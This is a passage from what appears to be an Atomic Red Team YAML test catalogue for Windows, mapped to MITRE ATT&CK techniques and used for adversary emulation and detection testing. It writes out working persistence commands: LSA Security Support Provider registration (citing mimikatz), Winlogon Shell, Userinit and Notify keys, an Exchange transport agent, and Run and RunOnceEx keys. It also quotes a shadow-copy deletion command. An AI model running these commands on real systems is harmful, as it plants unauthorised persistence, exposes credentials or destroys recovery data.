      \ and is the infrastructure for management data and operations on Windows systems.(Citation:\
      \ WMI 1-3) WMI is an administration feature that provides a uniform environment\
      \ to access Windows system components.\n\nThe WMI service enables both local\
      \ and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021)\
      \ such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003)\
      \ and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation:\
      \ WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM\
      \ operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI\
      \ 1-3) (Citation: Mandiant WMI)\n\nAn adversary can use WMI to interact with\
      \ local and remote systems and use it as a means to execute various behaviors,\
      \ such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007)\
      \ as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands\
      \ and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused\
      \ by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy\
      \ Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation:\
      \ WMI 6)\n\n**Note:** `wmic.exe` is deprecated as of January of 2024, with the\
      \ WMIC feature being \u201Cdisabled by default\u201D on Windows 11+. WMIC will\
      \ be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001)\
      \ as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell\
      \ and tools like `wbemtool.exe`, COM APIs can also be used to programmatically\
      \ interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)"
    mitre_examples: []
    mitre_id: T1047
    mitre_mitigations: []
    mitre_name: Windows Management Instrumentation
    mitre_platforms:
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1047
    - https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
    - https://www.mandiant.com/resources/reports
    - https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/
    - https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page?redirectedfrom=MSDN
    - https://techcommunity.microsoft.com/t5/windows-it-pro-blog/wmi-command-line-wmic-utility-deprecation-next-steps/ba-p/4039242
    mitre_related_techniques: []
  name: Create a Process using WMI Query and an Encoded Command
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: afdfd7e3-8a0b-409f-85f7-886fdf249c9e
  cleanup_command: '$oldvalue = $(Get-ItemPropertyValue -Path  "HKLM:\System\CurrentControlSet\Control\Lsa"
    -Name ''Security Packages old'' | Select-Object -ExpandProperty ''Security Packages
    old'');

    Set-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa -Name ''Security
    Packages'' -Value "$oldvalue";

    Remove-ItemProperty -Path  "HKLM:\System\CurrentControlSet\Control\Lsa" -Name
    ''Security Packages old'';'
  command: '$oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa
    -Name ''Security Packages'' | Select-Object -ExpandProperty ''Security Packages'');

    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name ''Security
    Packages old'' -Value "$oldvalue";

    $newvalue = "AtomicTest.dll";

    Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name ''Security Packages''
    -Value $newvalue

    '
  description: 'Add a value to a Windows registry Security Support Provider pointing
    to a payload .dll which will normally need to be copied in the system32 folder.

    A common DLL used with this techquite is the minilib.dll from mimikatz, see https://pentestlab.blog/2019/10/21/persistence-security-support-provider/

    '
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources:
    - 'Command: Command Execution'
    - 'Module: Module Load'
    - 'Windows Registry: Windows Registry Key Modification'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may abuse security support providers (SSPs) to
      execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local
      Security Authority (LSA) process at system start. Once loaded into the LSA,
      SSP DLLs have access to encrypted and plaintext passwords that are stored in
      Windows, such as any logged-on user''s Domain password or smart card PINs.


      The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security
      Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security
      Packages</code>. An adversary may modify these Registry keys to add new SSPs,
      which will be loaded the next time the system boots, or when the AddSecurityPackage
      Windows API function is called.(Citation: Graeber 2014)'
    mitre_examples: []
    mitre_id: T1547.005
    mitre_mitigations: []
    mitre_name: Security Support Provider
    mitre_platforms:
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1547/005
    - http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html
    - https://technet.microsoft.com/en-us/library/dn408187.aspx
    mitre_related_techniques: []
  name: Modify HKLM:\System\CurrentControlSet\Control\Lsa Security Support Provider
    configuration in registry
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: bf9f9d65-ee4d-4c3e-a843-777d04f19c38
  cleanup_command: 'Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"
    -Name "Shell" -Force -ErrorAction Ignore

    '
  command: 'Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"
    "Shell" "explorer.exe, #{binary_to_execute}" -Force

    '
  description: 'PowerShell code to set Winlogon shell key to execute a binary at logon
    along with explorer.exe.


    Upon successful execution, PowerShell will modify a registry value to execute
    cmd.exe upon logon/logoff.

    '
  get_prereq_command: ''
  input_arguments:
    binary_to_execute:
      default: C:\Windows\System32\cmd.exe
      description: Path of binary to execute
      type: path
  mitre_info:
    mitre_data_sources: &id017
    - 'Command: Command Execution'
    - 'Module: Module Load'
    - 'Process: Process Creation'
    - 'Windows Registry: Windows Registry Key Modification'
    mitre_defensive_measures: []
    mitre_description: "Adversaries may abuse features of Winlogon to execute DLLs\
      \ and/or executables when a user logs in. Winlogon.exe is a Windows component\
      \ responsible for actions at logon/logoff as well as the secure attention sequence\
      \ (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\
      \\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code>\
      \ and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\
      </code> are used to manage additional helper programs and functionalities that\
      \ support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious\
      \ modifications to these Registry keys may cause Winlogon to load and execute\
      \ malicious DLLs and/or executables. Specifically, the following subkeys have\
      \ been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence\
      \ Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that\
      \ handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the\
      \ user initialization program executed when a user logs on\n* Winlogon\\Shell\
      \ - points to explorer.exe, the system shell executed when a user logs on\n\n\
      Adversaries may take advantage of these features to repeatedly execute malicious\
      \ code and establish persistence."
    mitre_examples: []
    mitre_id: T1547.004
    mitre_mitigations: []
    mitre_name: Winlogon Helper DLL
    mitre_platforms: &id018
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1547/004
    - https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    mitre_related_techniques: []
  name: Winlogon Shell Key Persistence - PowerShell
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: fb32c935-ee2e-454b-8fa3-1c46b42e8dfb
  cleanup_command: 'Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"
    -Name "Userinit" -Force -ErrorAction Ignore

    '
  command: 'Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"
    "Userinit" "Userinit.exe, #{binary_to_execute}" -Force

    '
  description: 'PowerShell code to set Winlogon userinit key to execute a binary at
    logon along with userinit.exe.


    Upon successful execution, PowerShell will modify a registry value to execute
    cmd.exe upon logon/logoff.

    '
  get_prereq_command: ''
  input_arguments:
    binary_to_execute:
      default: C:\Windows\System32\cmd.exe
      description: Path of binary to execute
      type: path
  mitre_info:
    mitre_data_sources: *id017
    mitre_defensive_measures: []
    mitre_description: "Adversaries may abuse features of Winlogon to execute DLLs\
      \ and/or executables when a user logs in. Winlogon.exe is a Windows component\
      \ responsible for actions at logon/logoff as well as the secure attention sequence\
      \ (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\
      \\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code>\
      \ and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\
      </code> are used to manage additional helper programs and functionalities that\
      \ support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious\
      \ modifications to these Registry keys may cause Winlogon to load and execute\
      \ malicious DLLs and/or executables. Specifically, the following subkeys have\
      \ been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence\
      \ Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that\
      \ handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the\
      \ user initialization program executed when a user logs on\n* Winlogon\\Shell\
      \ - points to explorer.exe, the system shell executed when a user logs on\n\n\
      Adversaries may take advantage of these features to repeatedly execute malicious\
      \ code and establish persistence."
    mitre_examples: []
    mitre_id: T1547.004
    mitre_mitigations: []
    mitre_name: Winlogon Helper DLL
    mitre_platforms: *id018
    mitre_references:
    - https://attack.mitre.org/techniques/T1547/004
    - https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    mitre_related_techniques: []
  name: Winlogon Userinit Key Persistence - PowerShell
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: d40da266-e073-4e5a-bb8b-2b385023e5f9
  cleanup_command: 'Remove-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"
    -Force -ErrorAction Ignore

    '
  command: 'New-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"
    -Force

    Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"
    "DllName" "#{binary_to_execute}" -Type ExpandString -Force

    Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"
    "Logon" "#{function_to_execute}" -Force

    Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"
    "Impersonate" 1 -Type DWord -Force

    Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"
    "Asynchronous" 0 -Type DWord -Force

    '
  description: 'PowerShell code to set Winlogon Notify key to execute a notification
    package DLL at logon.


    Upon successful execution, PowerShell will modify a registry value to execute
    atomicNotificationPackage.dll upon logon.


    Please note that Winlogon Notifications have been removed as of Windows Vista
    / Windows Server 2008 and that this test thus only applies to erlier versions
    of Windows.

    '
  get_prereq_command: ''
  input_arguments:
    binary_to_execute:
      default: C:\Windows\Temp\atomicNotificationPackage.dll
      description: Path of notification package to execute
      type: path
    function_to_execute:
      default: AtomicTestFunction
      description: Function in notification package to execute
      type: string
  mitre_info:
    mitre_data_sources: *id017
    mitre_defensive_measures: []
    mitre_description: "Adversaries may abuse features of Winlogon to execute DLLs\
      \ and/or executables when a user logs in. Winlogon.exe is a Windows component\
      \ responsible for actions at logon/logoff as well as the secure attention sequence\
      \ (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\
      \\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code>\
      \ and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\
      </code> are used to manage additional helper programs and functionalities that\
      \ support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious\
      \ modifications to these Registry keys may cause Winlogon to load and execute\
      \ malicious DLLs and/or executables. Specifically, the following subkeys have\
      \ been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence\
      \ Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that\
      \ handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the\
      \ user initialization program executed when a user logs on\n* Winlogon\\Shell\
      \ - points to explorer.exe, the system shell executed when a user logs on\n\n\
      Adversaries may take advantage of these features to repeatedly execute malicious\
      \ code and establish persistence."
    mitre_examples: []
    mitre_id: T1547.004
    mitre_mitigations: []
    mitre_name: Winlogon Helper DLL
    mitre_platforms: *id018
    mitre_references:
    - https://attack.mitre.org/techniques/T1547/004
    - https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    mitre_related_techniques: []
  name: Winlogon Notify Key Logon Persistence - PowerShell
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 95a3c42f-8c88-4952-ad60-13b81d929a9d
  cleanup_command: 'Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"
    -Name "Shell" -Force -ErrorAction Ignore

    '
  command: 'Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"
    "Shell" "explorer.exe, #{binary_to_execute}" -Force

    '
  description: 'PowerShell code to set Winlogon shell key to execute a binary at logon
    along with explorer.exe.


    Upon successful execution, PowerShell will modify a registry value to execute
    cmd.exe upon logon/logoff.

    '
  get_prereq_command: ''
  input_arguments:
    binary_to_execute:
      default: C:\Windows\System32\cmd.exe
      description: Path of binary to execute
      type: path
  mitre_info:
    mitre_data_sources: *id017
    mitre_defensive_measures: []
    mitre_description: "Adversaries may abuse features of Winlogon to execute DLLs\
      \ and/or executables when a user logs in. Winlogon.exe is a Windows component\
      \ responsible for actions at logon/logoff as well as the secure attention sequence\
      \ (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\
      \\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code>\
      \ and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\
      </code> are used to manage additional helper programs and functionalities that\
      \ support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious\
      \ modifications to these Registry keys may cause Winlogon to load and execute\
      \ malicious DLLs and/or executables. Specifically, the following subkeys have\
      \ been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence\
      \ Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that\
      \ handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the\
      \ user initialization program executed when a user logs on\n* Winlogon\\Shell\
      \ - points to explorer.exe, the system shell executed when a user logs on\n\n\
      Adversaries may take advantage of these features to repeatedly execute malicious\
      \ code and establish persistence."
    mitre_examples: []
    mitre_id: T1547.004
    mitre_mitigations: []
    mitre_name: Winlogon Helper DLL
    mitre_platforms: *id018
    mitre_references:
    - https://attack.mitre.org/techniques/T1547/004
    - https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    mitre_related_techniques: []
  name: Winlogon HKLM Shell Key Persistence - PowerShell
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: f9b8daff-8fa7-4e6a-a1a7-7c14675a545b
  cleanup_command: 'Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"
    -Name "Userinit" -Force -ErrorAction Ignore

    '
  command: 'Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"
    "Userinit" "Userinit.exe, #{binary_to_execute}" -Force

    '
  description: 'PowerShell code to set Winlogon userinit key to execute a binary at
    logon along with userinit.exe.


    Upon successful execution, PowerShell will modify a registry value to execute
    cmd.exe upon logon/logoff.

    '
  get_prereq_command: ''
  input_arguments:
    binary_to_execute:
      default: C:\Windows\System32\cmd.exe
      description: Path of binary to execute
      type: path
  mitre_info:
    mitre_data_sources: *id017
    mitre_defensive_measures: []
    mitre_description: "Adversaries may abuse features of Winlogon to execute DLLs\
      \ and/or executables when a user logs in. Winlogon.exe is a Windows component\
      \ responsible for actions at logon/logoff as well as the secure attention sequence\
      \ (SAS) triggered by Ctrl-Alt-Delete. Registry entries in <code>HKLM\\Software[\\\
      \\Wow6432Node\\\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\</code>\
      \ and <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\
      </code> are used to manage additional helper programs and functionalities that\
      \ support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious\
      \ modifications to these Registry keys may cause Winlogon to load and execute\
      \ malicious DLLs and/or executables. Specifically, the following subkeys have\
      \ been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence\
      \ Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that\
      \ handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the\
      \ user initialization program executed when a user logs on\n* Winlogon\\Shell\
      \ - points to explorer.exe, the system shell executed when a user logs on\n\n\
      Adversaries may take advantage of these features to repeatedly execute malicious\
      \ code and establish persistence."
    mitre_examples: []
    mitre_id: T1547.004
    mitre_mitigations: []
    mitre_name: Winlogon Helper DLL
    mitre_platforms: *id018
    mitre_references:
    - https://attack.mitre.org/techniques/T1547/004
    - https://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    mitre_related_techniques: []
  name: Winlogon HKLM Userinit Key Persistence - PowerShell
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 43e92449-ff60-46e9-83a3-1a38089df94d
  cleanup_command: "if(Get-Command \"Get-TransportAgent\" -ErrorAction Ignore){\n\
    \  Disable-TransportAgent #{transport_agent_identity}\n  Uninstall-TransportAgent\
    \ #{transport_agent_identity}\n  Get-TransportAgent\n}\n"
  command: 'Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory
    #{class_factory} -AssemblyPath #{dll_path}

    Enable-TransportAgent #{transport_agent_identity}

    Get-TransportAgent | Format-List Name,Enabled

    '
  description: 'Install a Microsoft Exchange Transport Agent for persistence. This
    requires execution from an Exchange Client Access Server and the creation of a
    DLL with specific exports. Seen in use by Turla.

    More details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help

    '
  get_prereq_command: 'Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn

    '
  input_arguments:
    class_factory:
      default: Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory
      description: Class factory of transport agent.
      type: string
    dll_path:
      default: c:\program files\microsoft\Exchange Server\v15\bin\Microsoft.Exchange.Security.Interop.dll
      description: Path of DLL to use as transport agent.
      type: path
    transport_agent_identity:
      default: Security Interop Agent
      description: Friendly name of transport agent once installed.
      type: string
  mitre_info:
    mitre_data_sources:
    - 'File: File Creation'
    - 'Application Log: Application Log Content'
    mitre_defensive_measures: []
    mitre_description: "Adversaries may abuse Microsoft transport agents to establish\
      \ persistent access to systems. Microsoft Exchange transport agents can operate\
      \ on email messages passing through the transport pipeline to perform various\
      \ tasks such as filtering spam, filtering malicious attachments, journaling,\
      \ or adding a corporate signature to the end of all outgoing emails.(Citation:\
      \ Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport\
      \ agents can be written by application developers and then compiled to .NET\
      \ assemblies that are subsequently registered with the Exchange server. Transport\
      \ agents will be invoked during a specified stage of email processing and carry\
      \ out developer defined tasks. \n\nAdversaries may register a malicious transport\
      \ agent to provide a persistence mechanism in Exchange Server that can be triggered\
      \ by adversary-specified email events.(Citation: ESET LightNeuron May 2019)\
      \ Though a malicious transport agent may be invoked for all emails passing through\
      \ the Exchange transport pipeline, the agent can be configured to only carry\
      \ out specific tasks in response to adversary defined criteria. For example,\
      \ the transport agent may only carry out an action like copying in-transit attachments\
      \ and saving them for later exfiltration if the recipient email address matches\
      \ an entry on a list provided by the adversary. "
    mitre_examples: []
    mitre_id: T1505.002
    mitre_mitigations: []
    mitre_name: Transport Agent
    mitre_platforms:
    - Linux
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1505/002
    - https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help
    - https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf
    mitre_related_techniques: []
  name: Install MS Exchange Transport Agent Persistence
  platforms:
  - windows
  prereq_command: 'Get-TransportAgent -TransportService FrontEnd

    '
  references: []
- atomic_id: e55be3fd-3521-4610-9d1a-e210e42dcf05
  cleanup_command: 'REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    /V "Atomic Red Team" /f >nul 2>&1

    '
  command: 'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic
    Red Team" /t REG_SZ /F /D "#{command_to_execute}"

    '
  description: "Run Key Persistence\n\nUpon successful execution, cmd.exe will modify\
    \ the registry by adding \\\"Atomic Red Team\\\" to the Run key. Output will be\
    \ via stdout. \n"
  get_prereq_command: ''
  input_arguments:
    command_to_execute:
      default: C:\Path\AtomicRedTeam.exe
      description: Thing to Run
      type: path
  mitre_info:
    mitre_data_sources: &id019
    - 'Command: Command Execution'
    - 'File: File Modification'
    - 'Process: Process Creation'
    - 'Windows Registry: Windows Registry Key Creation'
    - 'Windows Registry: Windows Registry Key Modification'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may achieve persistence by adding a program to
      a startup folder or referencing it with a Registry run key. Adding an entry
      to the "run keys" in the Registry or startup folder will cause the program referenced
      to be executed when a user logs in.(Citation: Microsoft Run Key) These programs
      will be executed under the context of the user and will have the account''s
      associated permissions level.


      The following run keys are created by default on Windows systems:


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>


      Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation:
      Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code>
      is also available but is not created by default on Windows Vista and newer.
      Registry run key entries can reference programs directly or list them as a dependency.(Citation:
      Microsoft Run Key) For example, it is possible to load a DLL at logon using
      a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
      /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)


      Placing a program within a startup folder will also cause that program to execute
      when a user logs in. There is a startup folder location for individual user
      accounts as well as a system-wide startup folder that will be checked regardless
      of which user account logs in. The startup folder path for the current user
      is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>.
      The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start
      Menu\Programs\StartUp</code>.


      The following Registry keys can be used to set startup folder items for persistence:


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User
      Shell Folders</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell
      Folders</code>

      * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell
      Folders</code>

      * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User
      Shell Folders</code>


      The following Registry keys can control automatic startup of services during
      boot:


      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>


      Using policy settings to specify startup programs creates corresponding values
      in either of two Registry keys:


      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</code>


      Programs listed in the load value of the registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows
      NT\CurrentVersion\Windows</code> run automatically for the currently logged-on
      user.


      By default, the multistring <code>BootExecute</code> value of the registry key
      <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code>
      is set to <code>autocheck autochk *</code>. This value causes Windows, at startup,
      to check the file-system integrity of the hard disks if the system has been
      shut down abnormally. Adversaries can add other programs or processes to this
      registry value which will automatically launch at boot.


      Adversaries can use these configuration locations to execute malware, such as
      remote access tools, to maintain persistence through system reboots. Adversaries
      may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make
      the Registry entries look as if they are associated with legitimate programs.'
    mitre_examples: []
    mitre_id: T1547.001
    mitre_mitigations: []
    mitre_name: Registry Run Keys / Startup Folder
    mitre_platforms: &id020
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1547/001
    - https://blog.malwarebytes.com/cybercrime/2013/10/hiding-in-plain-sight/
    - https://docs.microsoft.com/en-us/windows/win32/sysinfo/32-bit-and-64-bit-application-data-in-the-registry
    - https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys
    - https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/
    - https://technet.microsoft.com/en-us/sysinternals/bb963902
    mitre_related_techniques: []
  name: Reg Key Run
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 554cbd88-cde1-4b56-8168-0be552eed9eb
  cleanup_command: 'REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
    /v 1 /f >nul 2>&1

    '
  command: 'REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
    /v 1 /d "#{thing_to_execute}"

    '
  description: "RunOnce Key Persistence.\n\nUpon successful execution, cmd.exe will\
    \ modify the registry to load AtomicRedTeam.dll to RunOnceEx. Output will be via\
    \ stdout. \n"
  get_prereq_command: ''
  input_arguments:
    thing_to_execute:
      default: C:\Path\AtomicRedTeam.dll
      description: Thing to Run
      type: path
  mitre_info:
    mitre_data_sources: *id019
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may achieve persistence by adding a program to
      a startup folder or referencing it with a Registry run key. Adding an entry
      to the "run keys" in the Registry or startup folder will cause the program referenced
      to be executed when a user logs in.(Citation: Microsoft Run Key) These programs
      will be executed under the context of the user and will have the account''s
      associated permissions level.


      The following run keys are created by default on Windows systems:


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>


      Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation:
      Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code>
      is also available but is not created by default on Windows Vista and newer.
      Registry run key entries can reference programs directly or list them as a dependency.(Citation:
      Microsoft Run Key) For example, it is possible to load a DLL at logon using
      a "Depend" key with RunOnceEx: <code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend
      /v 1 /d "C:\temp\evil[.]dll"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)


      Placing a program within a startup folder will also cause that program to execute
      when a user logs in. There is a startup folder location for individual user
      accounts as well as a system-wide startup folder that will be checked regardless
      of which user account logs in. The startup folder path for the current user
      is <code>C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code>.
      The startup folder path for all users is <code>C:\ProgramData\Microsoft\Windows\Start
      Menu\Programs\StartUp</code>.


      The following Registry keys can be used to set startup folder items for persistence:


      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User
      Shell Folders</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell
      Folders</code>

      * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell
      Folders</code>

      * <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User
      Shell Folders</code>


      The following Registry keys can control automatic startup of services during
      boot:


      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code>

      * <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code>

      * <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code>


